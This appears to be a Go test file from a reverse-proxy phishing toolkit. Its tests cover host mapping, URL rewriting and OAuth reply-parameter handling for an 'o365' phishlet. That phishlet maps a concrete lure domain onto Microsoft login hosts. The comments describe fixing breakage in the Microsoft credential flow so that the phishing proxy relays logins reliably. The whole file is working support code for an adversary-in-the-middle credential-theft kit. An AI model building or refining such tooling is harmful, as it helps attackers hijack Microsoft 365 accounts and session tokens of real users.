package core

import (
	"strings"
	"testing"
)

func newO365LikeProxy() *HttpProxy {
	cfg := &Config{
		phishletConfig: map[string]*PhishletConfig{
			"o365": {Hostname: "ms.tsl2.blackyou.dedyn.io", Enabled: true},
		},
		phishlets: map[string]*Phishlet{},
	}
	pl := &Phishlet{Name: "o365", proxyHosts: []ProxyHost{
		{phish_subdomain: "login", orig_subdomain: "login", domain: "microsoftonline.com"},
		{phish_subdomain: "login", orig_subdomain: "login", domain: "microsoft.com"},
		{phish_subdomain: "login", orig_subdomain: "login", domain: "windows.net"},
		{phish_subdomain: "login", orig_subdomain: "login", domain: "windowsazure.com"},
		{phish_subdomain: "aadcdn", orig_subdomain: "aadcdn", domain: "msauth.net"},
		{phish_subdomain: "aadcdn", orig_subdomain: "aadcdn", domain: "msftauth.net"},
	}}
	cfg.phishlets["o365"] = pl
	return &HttpProxy{cfg: cfg}
}

// TestOriginMappingDeterministic proves that reverse host mapping for a phish
// host shared by several originals is deterministic and prefers the primary
// (first/YAML-order = landing) endpoint, instead of answering randomly per
// call from map iteration (which sprayed one flow's requests across different
// upstream backends and broke /common/GetCredentialType).
func TestOriginMappingDeterministic(t *testing.T) {
	p := newO365LikeProxy()
	want := "login.microsoftonline.com"
	for i := 0; i < 50; i++ {
		got, ok := p.replaceHostWithOriginalForSession("login.ms.tsl2.blackyou.dedyn.io", "o365")
		if !ok || got != want {
			t.Fatalf("iter %d: got (%q,%v), want (%q,true)", i, got, ok, want)
		}
	}
	// aadcdn pair: first entry wins as well
	got, ok := p.replaceHostWithOriginalForSession("aadcdn.ms.tsl2.blackyou.dedyn.io", "o365")
	if !ok || got != "aadcdn.msauth.net" {
		t.Fatalf("aadcdn: got (%q,%v), want (aadcdn.msauth.net,true)", got, ok)
	}
	// unknown session falls back to the legacy lookup (still resolves)
	got, ok = p.replaceHostWithOriginalForSession("login.ms.tsl2.blackyou.dedyn.io", "")
	if !ok || !strings.HasPrefix(got, "login.") {
		t.Fatalf("fallback: got (%q,%v)", got, ok)
	}
}

// TestPatchUrlsOriginalFirstWins proves request-side conversion maps a shared
// phish host back to the primary original, so rewritten values round-trip.
func TestPatchUrlsOriginalFirstWins(t *testing.T) {
	p := newO365LikeProxy()
	pl := p.cfg.phishlets["o365"]
	out := string(p.patchUrls(pl, []byte("https://login.ms.tsl2.blackyou.dedyn.io/common/login"), CONVERT_TO_ORIGINAL_URLS))
	if out != "https://login.microsoftonline.com/common/login" {
		t.Fatalf("got %q", out)
	}
	// forward direction still fans out per original
	fwd := string(p.patchUrls(pl, []byte("https://login.windowsazure.com/?a=1"), CONVERT_TO_PHISHING_URLS))
	if fwd != "https://login.ms.tsl2.blackyou.dedyn.io/?a=1" {
		t.Fatalf("forward: got %q", fwd)
	}
}

// TestProtectReplyParamsRoundTrip proves that validated OAuth/WS-Fed reply
// parameter values survive response-side hostname rewriting untouched when
// they point at hosts OUTSIDE the phishlet's proxy set (unproxied providers),
// while reply params whose host IS proxied are rewritten normally (they
// round-trip through the proxy) and ordinary navigation URLs are rewritten.
func TestProtectReplyParamsRoundTrip(t *testing.T) {
	ext := "login.live.com" // external, must be shielded
	orig := "login.microsoftonline.com"
	phish := "login.ms.tsl2.blackyou.dedyn.io"

	body := `"urlPostMsa":"https://` + ext + `/ppsecure/partnerpost.srf?scope=openid` +
		`\u0026client_id=51483342` +
		`\u0026redirect_uri=https%3a%2f%2f` + ext + `%2fcommon%2ffederation%2foauth2msa` +
		`\u0026state=abc",` +
		`"plain":"redirect_uri=https://` + orig + `/common/x?y=1&z=2",` +
		`"wreply":"wreply=https%3a%2f%2f` + orig + `%2fcommon%2freprocess",` +
		`"nav":"https://` + orig + `/common/oauth2/authorize"`

	p := newO365LikeProxy()
	pl := p.cfg.phishlets["o365"]
	protected, restore := protectReplyParams([]byte(body), pl)

	// placeholder sanity: immune to both URL matchers used by patchUrls
	for _, tok := range []string{"\x00RPV0\x00", "\x00RPV1\x00"} {
		if MATCH_URL_REGEXP.MatchString(tok) || MATCH_URL_REGEXP_WITHOUT_SCHEME.MatchString(tok) {
			t.Fatalf("placeholder %q matches a URL pattern", tok)
		}
	}

	// simulate response-side rewriting (orig -> phish), as patchUrls does
	rewritten := strings.ReplaceAll(string(protected), orig, phish)
	final := string(restore([]byte(rewritten)))

	// reply value pointing at an unproxied host must be pristine original
	if !strings.Contains(final, `redirect_uri=https%3a%2f%2f`+ext+`%2fcommon%2ffederation%2foauth2msa`) {
		t.Errorf("external reply value not preserved:\n%s", final)
	}
	// reply values pointing at proxied hosts must be rewritten (round-trip)
	if !strings.Contains(final, `redirect_uri=https://`+phish+`/common/x?y=1&z=2`) {
		t.Errorf("proxied redirect_uri not rewritten:\n%s", final)
	}
	if !strings.Contains(final, `wreply=https%3a%2f%2f`+phish+`%2fcommon%2freprocess`) {
		t.Errorf("proxied wreply not rewritten:\n%s", final)
	}
	// ordinary navigation URL must be rewritten
	if !strings.Contains(final, `"nav":"https://`+phish+`/common/oauth2/authorize"`) {
		t.Errorf("navigation URL was not rewritten:\n%s", final)
	}
	// no placeholders may leak
	if strings.Contains(final, "\x00RPV") {
		t.Errorf("placeholder leaked into output:\n%s", final)
	}
}
